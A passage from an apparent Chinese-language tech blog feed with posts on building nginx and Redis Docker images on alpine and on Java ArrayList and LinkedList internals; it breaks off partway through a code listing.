class="line"><span class="bash">        libxslt-dev \</span></span><br><span class="line"><span class="bash">        gd-dev \</span></span><br><span class="line"><span class="bash">        geoip-dev &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="comment"># 开始编译nginx</span></span></span><br><span class="line">    cd /nginx-<span class="number">1.18</span>.<span class="number">0</span> &amp;&amp; \</span><br><span class="line">    ./configure --prefix=/sca/nginx &amp;&amp; \</span><br><span class="line">    make &amp;&amp; make install &amp;&amp; \</span><br><span class="line">    <span class="comment"># 删除不需要的文件以及缓存</span></span><br><span class="line">    rm -rf nginx-<span class="number">1.18</span>.<span class="number">0</span>.tar.gz &amp;&amp; \</span><br><span class="line">    rm -rf nginx-<span class="number">1.18</span>.<span class="number">0</span> &amp;&amp; \</span><br><span class="line">    rm -rf /sca/nginx/html &amp;&amp; \</span><br><span class="line">    rm -rf /var/lib/apk/* &amp;&amp; \</span><br><span class="line">    rm -rf /tmp/* &amp;&amp; \</span><br><span class="line">    <span class="comment"># 移除apk的依赖</span></span><br><span class="line">    apk del .build-deps \</span><br><span class="line">        gcc \</span><br><span class="line">        pcre-dev \</span><br><span class="line">        libc-dev \</span><br><span class="line">        make \</span><br><span class="line">        openssl-dev \</span><br><span class="line">        zlib-dev \</span><br><span class="line">        linux-headers \</span><br><span class="line">        curl \</span><br><span class="line">        gnupg \</span><br><span class="line">        libxslt-dev \</span><br><span class="line">        gd-dev \</span><br><span class="line">        geoip-dev &amp;&amp; \</span><br><span class="line">    <span class="comment"># 重新安装运行时需要的依赖</span></span><br><span class="line">    apk <span class="keyword">add</span><span class="bash"> pcre-dev</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cp html file to container</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./dist /sca/nginx/html</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./nginx.conf /sca/nginx/conf/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露80端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add run command </span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [ <span class="string">&quot;/sca/nginx/sbin/nginx&quot;</span> ]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><p>docker build -t fire-nginx:v1.0.0 .</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;坏境&quot;&gt;&lt;a href=&quot;#坏境&quot; class=&quot;headerlink&quot; title=&quot;坏境&quot;&gt;&lt;/a&gt;坏境&lt;/h2&gt;&lt;p&gt;docker：20.10.10&lt;/p&gt;
&lt;p&gt;nginx：1.18.0&lt;/p&gt;
&lt;p&gt;alpine：3.16.0&lt;/p&gt;
&lt;h2 id=&quot;准</summary>
      
    
    
    
    <category term="dockerfile" scheme="http://fireflyingup.github.io/categories/dockerfile/"/>
    
    
    <category term="nginx" scheme="http://fireflyingup.github.io/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>dockerfile基于alpine构建redis镜像</title>
    <link href="http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAredis%E9%95%9C%E5%83%8F/"/>
    <id>http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAredis%E9%95%9C%E5%83%8F/</id>
    <published>2022-06-21T15:49:13.000Z</published>
    <updated>2023-12-19T01:39:40.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一次自己通过dockerfile源码构建redis的血与泪，以及踩过的坑。</p><h2 id="坏境"><a href="#坏境" class="headerlink" title="坏境"></a>坏境</h2><p>docker：20.10.10</p><p>redis：5.0.14</p><p>alpine：3.16.0</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。</p><p>准备redis-5.0.14的源码包(<a href="https://download.redis.io/releases/redis-5.0.14.tar.gz">5.0.14版本直达</a>)，也可以去<a href="https://download.redis.io/releases/">所有版本</a>处自行下载对应的版本。</p><p>准备一个redis.conf配置文件，里面主要包含了我们对redis的一些配置，如下其中某些配置需要修改。</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">daemonize no</span><br></pre></td></tr></table></figure><p>准备完之后文件里面内容如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">╰─$ ls -alh</span><br><span class="line">total 4040</span><br><span class="line">drwxr-xr-x  5 guoying  staff   160B Jun 21 00:27 .</span><br><span class="line">drwxr-xr-x  7 guoying  staff   224B Jun 21 22:44 ..</span><br><span class="line">-rw-r--r--  1 guoying  staff   901B Jun 21 01:07 Dockerfile</span><br><span class="line">-rw-r--r--@ 1 guoying  staff   1.9M Jun 20 23:34 redis-5.0.14.tar.gz</span><br><span class="line">-rw-r--r--  1 guoying  staff    57K Jun 21 01:13 redis.conf</span><br></pre></td></tr></table></figure><h2 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h2><p>我们先想想整个dockerfile的步骤</p><p>1、首先得基于一个很小的系统（alpine）</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> alpine:<span class="number">3.16</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p>2、准备好需要的文件（redis源码包），可以在镜像里面下载（太慢）也可以自行拷贝进去，这里选择拷贝进去。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADD</span><span class="bash"> redis-5.0.14.tar.gz /  <span class="comment"># 将同级目录的redis源码压缩包放入镜像中（压缩包会自行解压）</span></span></span><br></pre></td></tr></table></figure><p>3、配置apk的源</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot;</span> &gt; /etc/apk/repositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot;</span> &gt;&gt; /etc/apk/r epositories</span></span><br></pre></td></tr></table></figure><p>4、安装需要的依赖</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> apk update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk add --no-cache --virtual .build-deps \ <span class="comment"># --no-cache表示不缓存</span></span></span><br><span class="line">    gcc \</span><br><span class="line">    g++ \</span><br><span class="line">    make \</span><br><span class="line">    libffi-dev \</span><br><span class="line">    openssl-dev </span><br><span class="line"><span class="comment"># redis还需要其他依赖，在redis的本地deps目录下面</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> /redis-5.0.14/deps &amp;&amp; \</span></span><br><span class="line"><span class="bash">    make lua hiredis linenoise</span></span><br></pre></td></tr></table></figure><p>5、编译redis，指定编译的地址</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> /redis-5.0.14 &amp;&amp; \</span></span><br><span class="line"><span class="bash">    make PREFIX=/sca/redis install</span></span><br></pre></td></tr></table></figure><p>6、删除编译时候需要运行时候不需要的依赖和多余文件</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> rm -rf /redis-5.0.14 &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /var/lib/apk/* &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /tmp/* &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk del .build-deps \</span></span><br><span class="line"><span class="bash">    gcc \</span></span><br><span class="line"><span class="bash">    g++ \</span></span><br><span class="line"><span class="bash">    make \</span></span><br><span class="line"><span class="bash">    libffi-dev \</span></span><br><span class="line"><span class="bash">    openssl-dev</span></span><br></pre></td></tr></table></figure><p>7、替换配置文件 并且 暴露端口</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> ./redis.conf /sca/redis/</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">6379</span></span><br></pre></td></tr></table></figure><p>8、准备启动参数</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> [ <span class="string">&quot;/sca/redis/bin/redis-server&quot;</span>, <span class="string">&quot;/sca/redis/redis.conf&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>这样我们整个dockerfile的文件就如下所示</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> alpine:<span class="number">3.16</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> redis-5.0.14.tar.gz /</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot;</span> &gt; /etc/apk/repositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot;</span> &gt;&gt; /etc/apk/r epositories</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apk update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk add --no-cache --virtual .build-deps \</span></span><br><span class="line"><span class="bash">    gcc \</span></span><br><span class="line"><span class="bash">    g++ \</span></span><br><span class="line"><span class="bash">    make \</span></span><br><span class="line"><span class="bash">    libffi-dev \</span></span><br><span class="line"><span class="bash">    openssl-dev </span></span><br><span class="line"><span class="comment"># redis还需要其他依赖，在redis的本地deps目录下面</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> /redis-5.0.14/deps &amp;&amp; \</span></span><br><span class="line"><span class="bash">    make lua hiredis linenoise</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> /redis-5.0.14 &amp;&amp; \</span></span><br><span class="line"><span class="bash">    make PREFIX=/sca/redis install</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> rm -rf /redis-5.0.14 &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /var/lib/apk/* &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /tmp/* &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk del .build-deps \</span></span><br><span class="line"><span class="bash">    gcc \</span></span><br><span class="line"><span class="bash">    g++ \</span></span><br><span class="line"><span class="bash">    make \</span></span><br><span class="line"><span class="bash">    libffi-dev \</span></span><br><span class="line"><span class="bash">    openssl-dev</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./redis.conf /sca/redis/</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">6379</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [ <span class="string">&quot;/sca/redis/bin/redis-server&quot;</span>, <span class="string">&quot;/sca/redis/redis.conf&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>接下来我们执行docker build -t fire-redis:v1.1.0 . ，等若干分钟之后</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAredis%E9%95%9C%E5%83%8F/image-20220622144726727.png"></div></div><p>好家伙345MB，这谁受得了，我们可以使用docker history b3cf3ac45ad1 (这个是IMAGE ID)查看镜像的制造过程</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAredis%E9%95%9C%E5%83%8F/image-20220622144948226.png"></div></div><p>接下来我们准备对镜像进行瘦身，最主要的一个过程就是对RUN 合并，dockerfile文件如下</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> alpine:<span class="number">3.16</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> redis-5.0.14.tar.gz /</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot;</span> &gt; /etc/apk/repositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot;</span> &gt;&gt; /etc/apk/r epositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk add --no-cache --virtual .build-deps \ </span></span><br><span class="line">    gcc \</span><br><span class="line">    g++ \</span><br><span class="line">    make \</span><br><span class="line">    libffi-dev \</span><br><span class="line">    openssl-dev &amp;&amp; \</span><br><span class="line">    cd /redis-<span class="number">5.0</span>.<span class="number">14</span>/deps &amp;&amp; \</span><br><span class="line">    make lua hiredis linenoise &amp;&amp; \</span><br><span class="line">    cd /redis-<span class="number">5.0</span>.<span class="number">14</span> &amp;&amp; \</span><br><span class="line">    make PREFIX=/sca/redis install &amp;&amp; \</span><br><span class="line">    rm -rf /redis-<span class="number">5.0</span>.<span class="number">14</span> &amp;&amp; \</span><br><span class="line">    rm -rf /var/lib/apk/* &amp;&amp; \</span><br><span class="line">    rm -rf /tmp/* &amp;&amp; \</span><br><span class="line">    apk del .build-deps \</span><br><span class="line">    gcc \</span><br><span class="line">    g++ \</span><br><span class="line">    make \</span><br><span class="line">    libffi-dev \</span><br><span class="line">    openssl-dev</span><br><span class="line">    </span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./redis.conf /sca/redis/</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">6379</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [ <span class="string">&quot;/sca/redis/bin/redis-server&quot;</span>, <span class="string">&quot;/sca/redis/redis.conf&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>可以看到大小有很大的缩减</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAredis%E9%95%9C%E5%83%8F/image-20220622145228819-5880765.png"></div></div><p>这样子我们就已经制作好了一个redis的镜像，此时使用docker run -d -p 6379:6379 fire-redis:v1.1.1启动容器</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAredis%E9%95%9C%E5%83%8F/image-20220622145552217.png"></div></div><h2 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h2><p>错误1:no such file or directory</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╰─$ docker build -t fire-nginx:v1.1.0 .                                                                                                                                                                                                                                     1 ↵</span><br><span class="line">[+] Building 0.1s (1/2)</span><br><span class="line"> =&gt; [internal] load build definition from Dockerfile                                  0.0s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 2B                                                    0.0s</span><br><span class="line">failed to solve with frontend dockerfile.v0: failed to <span class="built_in">read</span> dockerfile: open /var/lib/docker/tmp/buildkit-mount956713246/Dockerfile: no such file or directory</span><br></pre></td></tr></table></figure><p>解决：Dockerfile写成了DockerFile，注意f小写。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/Struggle99/article/details/124684534">https://blog.csdn.net/Struggle99/article/details/124684534</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;记录一次自己通过dockerfile源码构建redis的血与泪，以及踩过的坑。&lt;/p&gt;
&lt;h2 id=&quot;坏境&quot;&gt;&lt;a href=&quot;#坏境&quot; </summary>
      
    
    
    
    <category term="dockerfile" scheme="http://fireflyingup.github.io/categories/dockerfile/"/>
    
    
    <category term="redis" scheme="http://fireflyingup.github.io/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>Java集合</title>
    <link href="http://fireflyingup.github.io/2022/04/21/%E9%9B%86%E5%90%88/"/>
    <id>http://fireflyingup.github.io/2022/04/21/%E9%9B%86%E5%90%88/</id>
    <published>2022-04-21T02:40:20.000Z</published>
    <updated>2023-12-27T03:31:19.572Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Collection"><a href="#Collection" class="headerlink" title="Collection"></a>Collection</h2><div class="tag-plugin image"><div class="image-bg"><img src="/2022/04/21/%E9%9B%86%E5%90%88/image-20231219155331318.png"></div></div><h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><h4 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h4><p>ArrayList是一个Object数组实现的数据结构，线程不安全</p><p>默认初始化大小10</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Default initial capacity.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_CAPACITY = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><p>add方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e, Object[] elementData, <span class="keyword">int</span> s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s == elementData.length) <span class="comment">// 当下标的长度等于数组长度时候 扩容</span></span><br><span class="line">        elementData = grow(); <span class="comment">// 返回扩容后的数组</span></span><br><span class="line">    elementData[s] = e;</span><br><span class="line">    size = s + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 在父类AbstractList中定义，表示被修改的次数，一般与iterator一起使用，</span></span><br><span class="line">  <span class="comment">// 当modCount与expectCount不一致时，抛出ConcurrentModificationException异常</span></span><br><span class="line">    modCount++;</span><br><span class="line">    add(e, elementData, size);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">    rangeCheckForAdd(index); <span class="comment">// 判断下标的合法性 index&gt;0 &amp;&amp; index &lt;= size</span></span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> s;</span><br><span class="line">    Object[] elementData;</span><br><span class="line">    <span class="keyword">if</span> ((s = size) == (elementData = <span class="keyword">this</span>.elementData).length)</span><br><span class="line">        elementData = grow(); <span class="comment">// 扩容操作</span></span><br><span class="line">    System.arraycopy(elementData, index,</span><br><span class="line">                     elementData, index + <span class="number">1</span>,</span><br><span class="line">                     s - index); <span class="comment">// 使用System.arraycopy分配一个新的数组地址，然后降旧的数据拷贝过来</span></span><br><span class="line">    elementData[index] = element;</span><br><span class="line">    size = s + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>grow方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object[] grow(<span class="keyword">int</span> minCapacity) &#123;</span><br><span class="line">      <span class="keyword">int</span> oldCapacity = elementData.length;</span><br><span class="line">      <span class="keyword">if</span> (oldCapacity &gt; <span class="number">0</span> || elementData != DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123;</span><br><span class="line">        <span class="comment">// 新的数组长度=旧的数组长度+（新增的长度 和 就数组长度的二分之一 中的最大值）</span></span><br><span class="line">          <span class="keyword">int</span> newCapacity = ArraysSupport.newLength(oldCapacity,</span><br><span class="line">                  minCapacity - oldCapacity, <span class="comment">/* minimum growth */</span></span><br><span class="line">                  oldCapacity &gt;&gt; <span class="number">1</span>           <span class="comment">/* preferred growth */</span>);</span><br><span class="line">          <span class="keyword">return</span> elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> elementData = <span class="keyword">new</span> Object[Math.max(DEFAULT_CAPACITY, minCapacity)];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">      Objects.checkIndex(index, size);<span class="comment">//检查下标合法性</span></span><br><span class="line">      <span class="keyword">return</span> elementData(index); <span class="comment">//直接通过下标获取到数据</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ArrayList用数组作为底层数据结构，线程不安全，在新增一个对象的时候，当长度=数组的长度，会进行扩容，将大小扩容到 (当前长度+Math.max(需要新增得长度, 当前长度/2))，扩容的时候，通过Arrays.copyOf()申请一个新的数组地址。当在获取对象的时候直接通过index下标来获取。</p><p>性能</p><p>查找：通过下标查找，时间复杂度O(1)；通过值查找，时间复杂度O(n)。</p><p>顺序插入：直接在最后通过下标获取到数组位置赋值，时间复杂度O(1)，当长度不够时需要扩容。</p><p>非顺序插入: 需要将插入位置的数据往后移动。</p><h4 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h4><p>LinkedList底层是采用链表来实现的，也是线程不安全的。</p><p>Node类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">      E item;</span><br><span class="line">      Node&lt;E&gt; next; <span class="comment">// next节点</span></span><br><span class="line">      Node&lt;E&gt; prev; <span class="comment">// prev节点</span></span><br><span class="line"></span><br><span class="line">      Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123;</span><br><span class="line">          <span class="keyword">this</span>.item = element;</span><br><span class="line">          <span class="keyword">this</span>.next = next;</span><br><span class="line">          <span class="keyword">this</span>.prev = prev;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>故得出一个结论 LinkedList是双向链表。</p><p>LinkedList插入的基本操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span 